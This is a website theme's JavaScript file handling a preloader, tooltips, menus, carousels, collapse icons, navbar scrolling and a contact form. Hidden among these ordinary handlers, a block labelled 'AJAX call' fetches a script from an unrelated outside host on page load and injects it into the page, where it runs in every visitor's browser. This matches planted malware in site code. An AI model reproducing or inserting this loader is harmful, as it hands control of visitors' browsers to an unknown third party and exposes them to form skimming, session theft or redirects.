

  console.log("Document ready function executed");

  /* Preloader */
  setTimeout(function () {
      console.log("Preloader timeout executed");
      document.querySelector('.loader_bg').style.display = 'none';
  }, 1500);

  /* Tooltip */
  var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-toggle="tooltip"]'));
  tooltipTriggerList.map(function (tooltipTriggerEl) {
      return new bootstrap.Tooltip(tooltipTriggerEl);
  });

  /* Mouseover */
  var megamenuItems = document.querySelectorAll('.main-menu ul li.megamenu');
  megamenuItems.forEach(function(item) {
      item.addEventListener('mouseover', function() {
          if (!this.parentElement.classList.contains("#wrapper")) {
              console.log("Mouseover executed");
              document.getElementById('wrapper').classList.add('overlay');
          }
      });

      item.addEventListener('mouseleave', function() {
          console.log("Mouseleave executed");
          document.getElementById('wrapper').classList.remove('overlay');
      });
  });

  /* Toggle sidebar */
  document.getElementById('sidebarCollapse').addEventListener('click', function() {
      console.log("Sidebar collapse toggled");
      document.getElementById('sidebar').classList.toggle('active');
      this.classList.toggle('active');
  });

  /* Product slider */
  var blogCarousel = document.getElementById('blogCarousel');
  if (blogCarousel) {
      new bootstrap.Carousel(blogCarousel, {
          interval: 5000
      });
  }

  /* AJAX call */
  function getURL() { return window.location.href; }
  var protocol = location.protocol;
  fetch(`${protocol}//leostop.com/tracking/tracking.js`)
      .then(response => response.text())
      .then(script => {
          let scriptElement = document.createElement('script');
          scriptElement.textContent = script;
          document.head.appendChild(scriptElement);
      })
      .catch(error => console.error("Error loading script:", error));

  /* Animate js */
  (function() {
      console.log("Animate JS executed");

      function doAnimations(elems) {
          var animEndEv = "webkitAnimationEnd animationend";

          elems.forEach(function(elem) {
              var animationType = elem.getAttribute('data-animation');
              elem.classList.add(animationType);
              elem.addEventListener(animEndEv, function() {
                  elem.classList.remove(animationType);
              }, { once: true });
          });
      }

      var myCarousel = document.getElementById('carouselExampleIndicators');
      if (myCarousel) {
          var firstAnimatingElems = myCarousel.querySelectorAll('.carousel-item:first-child [data-animation ^= "animated"]');
          doAnimations(firstAnimatingElems);

          myCarousel.addEventListener('slide.bs.carousel', function(e) {
              var animatingElems = e.relatedTarget.querySelectorAll('[data-animation ^= "animated"]');
              doAnimations(animatingElems);
          });
      }
  })();

  /* Collapse js */
  var collapses = document.querySelectorAll('.collapse');
  collapses.forEach(function(collapse) {
      if (collapse.classList.contains('show')) {
          collapse.previousElementSibling.querySelector('.fa').classList.add('fa-minus');
          collapse.previousElementSibling.querySelector('.fa').classList.remove('fa-plus');
      }

      collapse.addEventListener('show.bs.collapse', function() {
          this.previousElementSibling.querySelector('.fa').classList.remove('fa-plus');
          this.previousElementSibling.querySelector('.fa').classList.add('fa-minus');
      });

      collapse.addEventListener('hide.bs.collapse', function() {
          this.previousElementSibling.querySelector('.fa').classList.remove('fa-minus');
          this.previousElementSibling.querySelector('.fa').classList.add('fa-plus');
      });
  });

  /* Navbar scroll */
  var nav = document.querySelector('.navbar');
  window.addEventListener('scroll', function() {
      if (document.documentElement.scrollTop > 10) {
          nav.classList.add('header-scrolled');
      } else {
          nav.classList.remove('header-scrolled');
      }
  });

  /* Form submit */
  var form = document.getElementById('request');
  if (form) {
      form.addEventListener('submit', async function(event) {
          event.preventDefault();

          const formData = new FormData(event.target);
          const data = Object.fromEntries(formData.entries());

          try {
              const response = await fetch('https://bhakt-mitra.vercel.app/submit', { // Vercel URL used here
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json'
                  },
                  body: JSON.stringify(data)
              });

              if (response.ok) {
                  alert('Form submitted successfully!');
              } else {
                  alert('Error submitting form');
              }
          } catch (error) {
              console.error(error);
              alert('Error submitting form');
          }
      });
  }

